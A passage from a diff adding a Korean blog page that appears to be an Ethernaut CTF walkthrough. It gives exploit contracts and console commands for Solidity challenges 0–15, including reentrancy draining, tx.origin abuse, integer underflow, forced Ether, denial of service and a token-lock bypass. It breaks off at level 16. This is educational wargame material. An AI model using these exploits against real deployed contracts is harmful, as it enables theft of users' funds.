@@ -1,0 +1,1796 @@
+<!DOCTYPE html>
+<html lang="kr" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>[Solution] Ethernaut | inhack</title>
+<meta name="keywords" content="solidity, smart contract, security, wargame, CTF" />
+<meta name="description" content="Ethernaut(The Web3/Solidity based wargame of Openzeppelin) Solutions">
+<meta name="author" content="inhack">
+<link rel="canonical" href="https://inhack.github.io/kr/posts/solution-ethernaut/" />
+<link crossorigin="anonymous" href="/assets/css/stylesheet.min.c88963fe2d79462000fd0fb1b3737783c32855d340583e4523343f8735c787f0.css" integrity="sha256-yIlj/i15RiAA/Q&#43;xs3N3g8MoVdNAWD5FIzQ/hzXHh/A=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://inhack.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://inhack.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://inhack.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://inhack.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://inhack.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<meta name="generator" content="Hugo 0.88.1" />
+<link rel="alternate" hreflang="en" href="https://inhack.github.io/posts/solution-ethernaut/" />
+<link rel="alternate" hreflang="kr" href="https://inhack.github.io/kr/posts/solution-ethernaut/" />
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="[Solution] Ethernaut" />
+<meta property="og:description" content="Ethernaut(The Web3/Solidity based wargame of Openzeppelin) Solutions" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://inhack.github.io/kr/posts/solution-ethernaut/" /><meta property="og:image" content="https://inhack.github.io/papermod-cover.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-01-26T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2022-01-26T00:00:00&#43;00:00" /><meta property="og:site_name" content="inhack" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://inhack.github.io/papermod-cover.png"/>
+
+<meta name="twitter:title" content="[Solution] Ethernaut"/>
+<meta name="twitter:description" content="Ethernaut(The Web3/Solidity based wargame of Openzeppelin) Solutions"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://inhack.github.io/kr/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "[Solution] Ethernaut",
+      "item": "https://inhack.github.io/kr/posts/solution-ethernaut/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "[Solution] Ethernaut",
+  "name": "[Solution] Ethernaut",
+  "description": "Ethernaut(The Web3/Solidity based wargame of Openzeppelin) Solutions",
+  "keywords": [
+    "solidity", "smart contract", "security", "wargame", "CTF"
+  ],
+  "articleBody": " ‘Ethernaut’ is a Web3/Solidity based wargame inspired on overthewire.org.\nThis article offers a brief summary and exploit code of each challenge.\n # 0. Hello Ethernaut  await contract.info() 'You will find what you need in info1().'  await contract.info1(); 'Try info2(), but with \"hello\" as a parameter.'  await contract.info2(\"hello\"); 'The property infoNum holds the number of the next info method to call.'  await contract.infoNum(); o {negative: 0, words: Array(2), length: 1, red: null} length: 1 negative: 0 red: null words: (2) [42, empty] [[Prototype]]: Object  await contract.info42(); 'theMethodName is the name of the next method.'  await contract.theMethodName(); 'The method name is method7123949.'  await contract.method7123949(); 'If you know the password, submit it to authenticate().'  await contract.password(); 'ethernaut0'  await contract.authenticate(\"ethernaut0\"); // Submit  # 1. Fallback Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import '@openzeppelin/contracts/math/SafeMath.sol'; contract Fallback { using SafeMath for uint256; mapping(address = uint) public contributions; address payable public owner; constructor() public { owner = msg.sender; contributions[msg.sender] = 1000 * (1 ether); } modifier onlyOwner { require( msg.sender == owner, \"caller is not the owner\" ); _; } function contribute() public payable { require(msg.value  0.001 ether); contributions[msg.sender] += msg.value; if(contributions[msg.sender]  contributions[owner]) { owner = msg.sender; } } function getContribution() public view returns (uint) { return contributions[msg.sender]; } function withdraw() public onlyOwner { owner.transfer(address(this).balance); } receive() external payable { // Vulnerable!  require(msg.value  0 \u0026\u0026 contributions[msg.sender]  0); owner = msg.sender; } } 대상 컨트랙트의 ownership을 가져오는 것이 목표이다.\n컨트랙트를 배포한 owner의 contributions 금액은 1000 Ether로 초기화되어 있으며, contribute() 함수만 본다면 해당 금액 이상의 contribute를 해야 컨트랙트의 owner가 될 수 있다. (1000 Ether도 없을 뿐더러, 한번 contribute 실행시마다 0.001 Ether씩만 보낼 수 있다.)\n컨트랙트에서 Ether를 송금받기 위해 존재하는 receive() 함수에 취약점이 존재한다. contribute를 한 사용자가 receive() 함수를 실행 시에 owner가 될 수 있도록 코드가 작성되어 있다.\nExploit  await contract.getContribution();  await contract.contribute({from: player, value: toWei(\"0.0001\")});  await sendTransaction({from: player, to:contract.address, value: toWei(\"0.0001\")});  await contract.withdraw(); // Submit  # 2. Fallout Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import '@openzeppelin/contracts/math/SafeMath.sol'; contract Fallout { using SafeMath for uint256; mapping (address = uint) allocations; address payable public owner; /* constructor */ function Fal1out() public payable { // constructor function name typing mistake  owner = msg.sender; allocations[owner] = msg.value; } modifier onlyOwner { require( msg.sender == owner, \"caller is not the owner\" ); _; } function allocate() public payable { allocations[msg.sender] = allocations[msg.sender].add(msg.value); } function sendAllocation(address payable allocator) public { require(allocations[allocator]  0); allocator.transfer(allocations[allocator]); } function collectAllocations() public onlyOwner { msg.sender.transfer(address(this).balance); } function allocatorBalance(address allocator) public view returns (uint) { return allocations[allocator]; } } 마찬가지로 대상 컨트랙트의 ownership을 가져오는 것이 목표이다.\nconstuctor 주석이 가리키는 Fal1out()을 호출하면 된다.\nExploit  await contract.Fal1out({from: player, value: toWei(\"0.000000000000000001\")}); // 1 wei  // Submit  # 3. Coin Flip Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import '@openzeppelin/contracts/math/SafeMath.sol'; contract CoinFlip { using SafeMath for uint256; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.number.sub(1))); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = blockValue.div(FACTOR); bool side = coinFlip == 1 ? true : false; if (side == _guess) { consecutiveWins++; return true; } else { consecutiveWins = 0; return false; } } } 10번 연속 동전던지기 결과를 맞춰야 하며, 동전던지기 결과는 uint256(blockhash(block.number.sub(1))) / FACTOR 로 계산한다. 또한 lastHash를 이용해, 동일 블록에 있는 트랜잭션은 revert() 시킨다.\nFACTOR 값은 uint256 타입이 가질 수 있는 최솟값과 최댓값의 중간 값이며, uint256(blockhash(block.number.sub(1)))는 트랜잭션이 포함된 블록의 이전 블록의 해시값을 uint256 타입으로 변환한 값이다.\n결과적으로 트랜잭션이 포함된 블록의 이전블록의 해시값을 uint256으로 타입변환한 값이 중간값을 기준으로 이하면 false, 이상이면 true로 계산된다.\n동전던지기 결과를 맞추기 위해 공격자가 전송하는 트랜잭션이 포함된 블록을 기준으로 결과값이 계산되므로, 값 예측이 가능하다.\nExploit // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import '@openzeppelin/contracts/math/SafeMath.sol'; interface ICoinFlip { function flip(bool _guess) external returns (bool); } contract CoinFlipExploit { using SafeMath for uint256; address coinflip; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor (address _coinflip) public { coinflip = _coinflip; } function exploit() public { uint256 blockValue = uint256(blockhash(block.number.sub(1))); uint256 coinFlip = blockValue.div(FACTOR); bool answer = coinFlip == 1 ? true : false; ICoinFlip(coinflip).flip(answer); } }  # 4. Telephone Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Telephone { address public owner; constructor() public { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } } } 대상 컨트랙트의 ownership을 가져오는 것이 목표이다.\nchangeOwner()는 tx.origin과 msg.sender이 일치하지 않는 경우, 인자로 전달된 주소에게 ownership을 부여한다.\n공격자가 컨트랙트를 통하여 changeOwner()를 호출하면 된다.\n tx.origin = 트랜잭션을 최초 생성 및 시작한 주소 - 공격자 EOA 주소 msg.sender = 컨트랙트의 함수를 호출한 주소 - 공격자 컨트랙트 주소  Exploit // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface ITelephone { function changeOwner(address _owner) external; } contract TelephoneExploit { address newOwner; address telephoneAddr; constructor (address _telephoneAddr, address _newOwner) public { telephoneAddr = _telephoneAddr; newOwner = _newOwner; } function exploit() public { ITelephone(telephoneAddr).changeOwner(newOwner); } }  # 5. Token Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Token { mapping(address = uint) balances; uint public totalSupply; constructor(uint _initialSupply) public { balances[msg.sender] = totalSupply = _initialSupply; } function transfer(address _to, uint _value) public returns (bool) { require(balances[msg.sender] - _value = 0); // bypass (Integer Underflow)  balances[msg.sender] -= _value; // Token++++++++ (Integer Underflow)  balances[_to] += _value; return true; } function balanceOf(address _owner) public view returns (uint balance) { return balances[_owner]; } } 공격자에게 20개의 토큰이 주어지는데, 컨트랙트의 취약점을 이용해 최대한 많은 수의 토큰을 확보하는 것이 목표이다.\nSolidity 0.8.0 미만 버전은 Integer Overflow/Underflow 발생 시, 에러없이 트리거가 된다.\n21개를 임의의 주소로 전송하면, Integer Overflow(20 - 21)에 의해, 공격자는 2**256 - 1개 토큰을 갖게된다.\nExploit  contract.balanceOf(player); Promise {pending, _events: o, emit: ƒ, on: ƒ, …} ... [[PromiseResult]]: o length: 1 negative: 0 red: null words: (2) [20, empty] // 20 Token [[Prototype]]: Object  await contract.transfer(contract.address, toWei(\"21\"));  contract.balanceOf(player); Promise {pending, _events: o, emit: ƒ, on: ƒ, …} ... [[PromiseResult]]: o length: 10 negative: 0 red: null words: Array(11) // 2**256 - 1 Token 0: 13369364 1: 4247761 2: 67104201 3: 67108863 4: 67108863 5: 67108863 6: 67108863 7: 67108863 8: 67108863 9: 4194303 length: 11 [[Prototype]]: Array(0) [[Prototype]]: Object // Submit  # 6. Delegation Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Delegate { address public owner; constructor(address _owner) public { owner = _owner; } function pwn() public { owner = msg.sender; } } contract Delegation { address public owner; Delegate delegate; constructor(address _delegateAddress) public { delegate = Delegate(_delegateAddress); owner = msg.sender; } fallback() external { (bool result,) = address(delegate).delegatecall(msg.data); if (result) { this; } } } 대상 컨트랙트의 ownership을 가져오는 것이 목표이다.\nDelegation 컨트랙트의 fallback()에서 delegatecall(msg.data)를 사용하여 Delegate 컨트랙트를 호출한다.\nmsg.data에 pwn() 함수를 호출하는 abi 값을 전달하여, Delegate 컨트랙트의 pwn()을 호출하고 ownership을 획득할 수 있다.\nExploit  let payload = web3.eth.abi.encodeFunctionSignature('pwn()')  await sendTransaction({from: player, to:contract.address, data: payload}); // Submit  # 7. Force Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Force {/* MEOW ? /\\_/\\ / ____/ o o \\ /~____ =ø= / (______)__m_m) */} 위 컨트랙트의 잔고는 다음과 같이 0인 상태인데, 0보다 큰 잔액을 만드는 것이 목표이다.\n await getBalance(contract.address) '0' fallback()이나 receive() 함수가 구현되어 있다면, 다음과 같이 보내면 되지만 그렇지 않은 상황이기 때문에 다른 방법이 필요하다. (아래 트랜잭션 전송 시, 에러 발생)\n sendTransaction({from: player, to:contract.address, value: toWei(\"0.000000000000000002\")}); selfdestruct(address dest) 함수를 이용한 컨트랙트를 통해 대상 컨트랙트에 강제로 Ether를 송신할 수 있다.\n selfdestruct() 호출 시, 컨트랙트 스스로를 파괴하고 컨트랙트가 가진 Ether를 address dest로 송신  Exploit // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract ForceExploit { function exploit(address payable _forceAddr) payable public { require(msg.value  1 wei); selfdestruct(_forceAddr); } }  await getBalance(contract.address) '0.000000000000000002'  # 8. Vault summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Vault { bool public locked; // slot 0 : 1 byte  bytes32 private password; // slot 1 : 32 bytes  constructor(bytes32 _password) public { locked = true; password = _password; } function unlock(bytes32 _password) public { if (password == _password) { locked = false; } } } private으로 저장되어 있는 bytes32 타입의 password 값을 unlock()에 전달하는 것이 목표이다.\n기본적으로 storage 영역에 저장되는 변수들은 32 bytes 기준으로 slot 0부터 할당되어 저장되며, private으로 선언되더라도 값을 확인할 수 있다.\nExploit  const hexPassword = await web3.eth.getStorageAt(contract.address, 1);  hexPassword '0x412076657279207374726f6e67207365637265742070617373776f7264203a29'  await web3.utils.hexToAscii(hexPassword) 'A very strong secret password :)'  await contract.unlock(hexPassword); // Submit  # 9. King Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract King { address payable king; uint public prize; address payable public owner; constructor() public payable { owner = msg.sender; king = msg.sender; prize = msg.value; } receive() external payable { require(msg.value = prize || msg.sender == owner); king.transfer(msg.value); king = msg.sender; prize = msg.value; } function _king() public view returns (address payable) { return king; } } 대상 컨트랙트의 기능이 동작하지 않는 DoS(Denial of Service) 상태로 만드는 것이 목표이다.\n컨트랙트는 receive()를 통해 Ether를 송금받을 수 있으며 다음과 같이 동작한다.\n (1) 기존의 prize보다 높은 Ether를 송금한 사람이 새로운 king이 된다. (2) 기존의 king에게는 새로운 king이 송금한 Ether를 전송해준다.  공격자가 컨트랙트를 생성하여 king으로 만들고, 해당 컨트랙트의 receive() 함수에서 무조건 revert() 를 호출하도록 하면된다.\nKing 컨트랙트는 다른 사용자들이 높은 Ether를 송금하더라도, 기존의 King인 공격자 컨트랙트에게 Ether를 송금하는 king.transfer(msg.value); 부분에서 revert()가 발생하여 DoS 상태에 빠진다.\n초기 owner, king 및 prize는 아래와 같다.\n await contract.owner() '0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5'  await contract._king() '0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5'  fromWei(await contract.prize()) '0.001' Exploit Solidity Withdrawal Pattern 참고\n// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract KingExploit { function exploit(address payable targetAddr) public payable { (bool result, ) = targetAddr.call.value(msg.value)(\"\"); if(!result) revert(\"Failed to become a king..!\"); } receive() external payable { revert(\"DoS\"); } }  Deploy 후 exploit() 함수 호출 시, _kingAddr에 King 컨트랙트의 인스턴스 주소를 입력하고 msg.value는 0.001보다 큰 값(ex. 0.01, 0.002 등)을 입력한다.   await contract.owner() '0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5'  await contract._king() '0x2cfc9a56e5223f453ddFDd942Fa1B305b257650E'  fromWei(await contract.prize()) '0.002' // Submit  # 10. Re-entrancy Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import '@openzeppelin/contracts/math/SafeMath.sol'; contract Reentrance { using SafeMath for uint256; mapping(address = uint) public balances; function donate(address _to) public payable { balances[_to] = balances[_to].add(msg.value); } function balanceOf(address _who) public view returns (uint balance) { return balances[_who]; } function withdraw(uint _amount) public { if(balances[msg.sender] = _amount) { // Check  (bool result,) = msg.sender.call{value:_amount}(\"\"); // Interaction  if(result) { _amount; } balances[msg.sender] -= _amount; // Effects  } } receive() external payable {} } 대상 컨트랙트가 가진 모든 자금을 가져오는 것이 목표이다.\nChecks-Effects Interfaction 패턴이 적용되지 않아 전형적인 Re-Entrancy 공격에 취약한 코드이다.\n이에 따라 공격자는 fallback()이나 receive() 등을 이용해 대상 컨트랙트의 withdraw()를 연속적으로 재호출할 수 있다.\nExploit  await getBalance(contract.address) '0.001' 현재 컨트랙트가 가진 잔액은 0.001 ETH\n// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface IReentrace { function donate(address _to) external payable; function balanceOf(address _who) external view returns (uint balance); function withdraw(uint _amount) external; } contract ReentranceExploit { address payable reentranceAddr; address payable attackerEOA; constructor (address payable _reentranceAddr) public { reentranceAddr = _reentranceAddr; attackerEOA = msg.sender; } function exploit() external payable { require(msg.value == 0.001 ether); IReentrace(reentranceAddr).donate.value(0.001 ether)(address(this)); IReentrace(reentranceAddr).withdraw(0.001 ether); } function getBalance() public view returns (uint256) { return address(this).balance; } function getTargetBalance() public view returns (uint256) { return reentranceAddr.balance; } function self_destruct() external { require(msg.sender == attackerEOA); selfdestruct(attackerEOA); } receive() external payable { if (reentranceAddr.balance = 0.001 ether) { IReentrace(reentranceAddr).withdraw(0.001 ether); } } } ReentranceExploit 컨트랙트의 exploit() 호출 시, 다음 공격 흐름이 Reentrance 컨트랙트의 잔고가 바닥이 날 때까지 반복된다.\n (1) ReentranceExploit 컨트랙트의 주소를 이용해 0.001 ETH donate()  Reentrance 컨트랙트의 balances[ReentranceExploitAddress] = 0.001 ETH   (2) withdraw(0.001 ether)를 호출하여 donation한 금액 출금 요청 (3) ReentranceExploit 컨트랙트의 receive() 함수가 ETH를 수신하기 위해 호출됨 (4) receive()에서 withdraw()를 다시 호출  이후 self_destruct() 함수를 호출하여, 가져온 자금들을 공격자 EOA로 송금해주면 된다!\n// ReentranceExploit Contract Deploy  // exploit()   await getBalance(contract.address) '0' // Submit  # 11. Elevator Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface Building { function isLastFloor(uint) external returns (bool); } contract Elevator { bool public top; // false  uint public floor; // 0  function goTo(uint _floor) public { Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) { floor = _floor; top = building.isLastFloor(floor); } } } bool 타입의 top을 true로 만드는 것이 목표이다.\nElevator 컨트랙트는 goTo() 함수를 제공하며, 입력된 _floor를 msg.sender의 isLastFloor() 인터페이스에 전달하여 결과를 수신한다.\nExploit // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface IElevator { // function  function goTo(uint _floor) external; // variable  function floor() external returns (uint); } contract ElevatorExploit { address targetAddr; constructor (address _targetAddr) public { targetAddr = _targetAddr; } function exploit(uint _inputFloor) external { IElevator(targetAddr).goTo(_inputFloor); } function isLastFloor(uint _floor) external returns (bool){ if(IElevator(targetAddr).floor() != _floor) { return false; } else { return true; } } } 공격자가 입력한 층이 무조건 Last Floor 및 Top이 되도록 하는 isLastFloor() 인터페이스를 구현하면 된다.\n exploit() 함수에 공격자가 Top이 되도록 원하는 값을 입력   await contract.top() false  await contract.floor() o {negative: 0, words: Array(2), length: 1, red: null} length: 1 negative: 0 red: null words: (2) [0, empty] [[Prototype]]: Object // exploit(50)   await contract.top() true  await contract.floor() o {negative: 0, words: Array(2), length: 1, red: null} length: 1 negative: 0 red: null words: (2) [50, empty] [[Prototype]]: Object // Submit  # 12. Privacy Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Privacy { bool public locked = true; uint256 public ID = block.timestamp; uint8 private flattening = 10; uint8 private denomination = 255; uint16 private awkwardness = uint16(now); bytes32[3] private data; constructor(bytes32[3] memory _data) public { data = _data; } function unlock(bytes16 _key) public { require(_key == bytes16(data[2])); locked = false; } /* A bunch of super advanced solidity algorithms... ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^` .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*., *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^ ,---/V\\ `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*. ~|__(o.o) ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*' UU UU */ } 8. Vault 문제와 같이 private으로 선언하더라도 storage 영역에 저장된 값은 확인이 가능하다.\n대상 컨트랙트의 bytes32[3] data fixed array의 마지막 요소인 data[2]에 저장되어 있는 키 값을 찾아야한다.\nPrivacy 컨트랙트의 storage 영역의 값들은 다음과 같은 슬롯에 할당된다.\nbool public locked = true; // slot 0 : 1 bytes uint256 public ID = block.timestamp; // slot 1 : 32 bytes uint8 private flattening = 10; // slot 2 : 1 bytes uint8 private denomination = 255; // slot 2 : 1 bytes uint16 private awkwardness = uint16(now); // slot 2 : 2 bytes bytes32[3] private data; // slot 3 : data[0] // slot 4 : data[1] // slot 5 : data[2] Exploit  await web3.eth.getStorageAt(contract.address, 0); '0x0000000000000000000000000000000000000000000000000000000000000001'  await web3.eth.getStorageAt(contract.address, 1); '0x0000000000000000000000000000000000000000000000000000000062011490'  await web3.eth.getStorageAt(contract.address, 2); '0x000000000000000000000000000000000000000000000000000000001490ff0a'  await web3.eth.getStorageAt(contract.address, 3); '0x3edd311ebeeb5f8c81ac1d7ded889b1dc76be556554cef0c35cdb8c4121fce96'  await web3.eth.getStorageAt(contract.address, 4); '0xabaab090eedbeb41c34eebd1053d50f6d643142476fa67ba9ab668b8fff808c6'  await web3.eth.getStorageAt(contract.address, 5); // bytes32 data[2] '0x454b326e527ce34b20304b322983ab4030370380dfad9c0f1e40907c51851341'  data2 = await web3.eth.getStorageAt(contract.address, 5); '0x454b326e527ce34b20304b322983ab4030370380dfad9c0f1e40907c51851341'  data2_ascii = web3.utils.hexToAscii(data2) 'EK2nR|ãK 0K2)\\x83«@07\\x03\\x80ß­\\x9C\\x0F\\x1E@\\x90|Q\\x85\\x13A'  key = web3.utils.asciiToHex(data2_ascii.substr(0, data2_ascii.length / 2)) '0x454b326e527ce34b20304b322983ab40' await contract.unlock(key) // Submit  # 13. Gatekeeper One Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import '@openzeppelin/contracts/math/SafeMath.sol'; contract GatekeeperOne { using SafeMath for uint256; address public entrant; modifier gateOne() { require(msg.sender != tx.origin); // using contracts  _; } modifier gateTwo() { require(gasleft().mod(8191) == 0); _; } modifier gateThree(bytes8 _gateKey) { require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\"); require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\"); require(uint32(uint64(_gateKey)) == uint16(tx.origin), \"GatekeeperOne: invalid gateThree part three\"); _; } function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { entrant = tx.origin; return true; } } GateKeeperOne 컨트랙트의 enter() 함수를 호출하여 address entrant에 tx.origin 값을 저장하면 통과할 수 있다.\nenter() 함수에는 gateOne / gateTwo / gateThree 와 같이 3개의 modifier(함수 제어자)가 적용되어 있으며, 해당 함수 제어자들의 조건을 만족시켜야 함수 내부의 코드가 실행된다.\ngateOne()\n msg.sender와 tx.origin이 다른 주소여야 하므로, 컨트랙트를 통해 enter()를 호출하면 조건을 만족할 수 있다.  gateTwo()\n  gateTwo() 호출 시점에 남아있는 잔여 가스인 gasleft() 에 modular 8191 연산의 결과가 0이어야 한다.\n  Brute-Force를 통해 해결했다.\n  gateThree()\n enter() 함수로 전달된 bytes8 _gateKey의 상위부터 5,6번째 바이트는 00 00 이어야 하고, 7,8번째 바이트는 tx.origin(공격자 EOA) 주소의 하위 2바이트 값과 동일해야 한다.  Exploit // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract GatekeeperOneExploit { address targetAddr; uint64 public gatekeyUint = uint64(uint256(uint160(msg.sender)) \u0026 0xFFFFFFFF0000FFFF); bytes8 public gatekey = bytes8(gatekeyUint); constructor (address _targetAddr) public { targetAddr = _targetAddr; } function exploit() external returns (bool){ bytes memory payload = abi.encodeWithSignature(\"enter(bytes8)\", gatekey); for(uint16 i=0 ; i1000 ; i++){ (bool bSuccess, bytes memory data) = targetAddr.call.gas(i + 8191*5)(payload); if(bSuccess){ return true; } } } }  await contract.entrant() '0x0000000000000000000000000000000000000000' // GatekeeperOneExploit Contract Deploy  // exploit()   await contract.entrant() '0x--------------AttackerEOA---------------' // Submit  # 14. Gatekeeper Two Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract GatekeeperTwo { address public entrant; modifier gateOne() { require(msg.sender != tx.origin); _; } modifier gateTwo() { uint x; assembly { x := extcodesize(caller()) } require(x == 0); _; } modifier gateThree(bytes8 _gateKey) { require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1); _; } function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { entrant = tx.origin; return true; } } 이전 문제와 마찬가지로 enter() 함수를 호출하여 address entrant에 tx.origin 값을 저장하면 통과할 수 있으며, 3개의 modifier를 만족시켜야 한다.\ngateOne()\n msg.sender와 tx.origin이 다른 주소여야 하므로, 컨트랙트를 통해 enter()를 호출하면 조건을 만족할 수 있다.  gateTwo()\n  extcodesize()는 인자로 전달된 계정의 코드 사이즈를 반환하는 함수이므로, 호출한 컨트랙트의 코드 사이즈가 0이어야 한다.\n  이더리움 yellow paper에 따르면, constructor() 호출 시점에 코드 사이즈는 0으로 계산된다.\n  공격자 컨트랙트의 constructor()에서 enter()를 호출하면 된다.\n  gateThree()\n msg.sender(공격자 컨트랙트 주소)를 해시한 값의 하위 8바이트 값과 _gateKey XOR 연산의 결과가 2**64-1이 되어야 한다.  Exploit // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract GatekeeperTwoExploit { bytes8 public gatekey; constructor (address _targetAddr) public { gatekey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1)); _targetAddr.call(abi.encodeWithSignature(\"enter(bytes8)\", gatekey)); } }  await contract.entrant() '0x0000000000000000000000000000000000000000' // GatekeeperTwoExploit Contract Deploy   await contract.entrant() '0x--------------AttackerEOA---------------' // Submit  # 15. Naught Coin Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import '@openzeppelin/contracts/token/ERC20/ERC20.sol'; contract NaughtCoin is ERC20 { // string public constant name = 'NaughtCoin';  // string public constant symbol = '0x0';  // uint public constant decimals = 18;  uint public timeLock = now + 10 * 365 days; uint256 public INITIAL_SUPPLY; address public player; constructor(address _player) ERC20('NaughtCoin', '0x0') public { player = _player; INITIAL_SUPPLY = 1000000 * (10**uint256(decimals())); // _totalSupply = INITIAL_SUPPLY;  // _balances[player] = INITIAL_SUPPLY;  _mint(player, INITIAL_SUPPLY); emit Transfer(address(0), player, INITIAL_SUPPLY); } function transfer(address _to, uint256 _value) override public lockTokens returns(bool) { super.transfer(_to, _value); } // Prevent the initial owner from transferring tokens until the timelock has passed  modifier lockTokens() { if (msg.sender == player) { require(now  timeLock); _; } else { _; } } } player에게 ERC20 기반의 NaughtCoin 토큰 1,000,000개가 지급되었는데, transfer() 함수에 lockTokens() 제어자를 적용하여 10년동안 다른 지갑으로 옮기지 못하도록 설정되어 있다.\ntransfer() 함수는 super.trasnfer()에 의해 상속받은 ERC20의 transfer() 함수를 호출하게 된다.\nERC20에서는 토큰을 전송하기 위해 transfer() 이외에 approve() / transferFrom() 함수가 있다.\n해당 기능을 이용해 lockup periods를 우회하여 토큰 전송이 가능하다.\nExploit // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import '@openzeppelin/contracts/token/ERC20/ERC20.sol'; contract NaughtCoinExploit { uint256 public INITIAL_SUPPLY = 1000000 * (10**18); address public player; ERC20 public naughtCoin; constructor(address _player, address _naughtCoinAddress) public { player = _player; naughtCoin = ERC20(_naughtCoinAddress); } function exploit() external { naughtCoin.transferFrom(player, address(this), INITIAL_SUPPLY); } }  let initial_supply = await contract.balanceOf(player);  web3.utils.fromWei(initial_supply); '1000000'  web3.utils.fromWei(await contract.balanceOf(\"0x4a81672E4952097EFE35Ee835e36F72cFF8eFDaB\")); '0'  await contract.approve([ExploitContractAddress], initial_supply); // await contract.approve(\"0x4a81672E4952097EFE35Ee835e36F72cFF8eFDaB\", initial_supply);  // Exploit Contract Deploy \u0026 call exploit()   web3.utils.fromWei(await contract.balanceOf(player)); '0'  web3.utils.fromWei(await contract.balanceOf(\"0x4a81672E4952097EFE35Ee835e36F72cFF8eFDaB\")); '1000000' // Submit # 16. Preservation Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Preservation { // public library contracts  address public timeZone1Library; // slot 0  address public 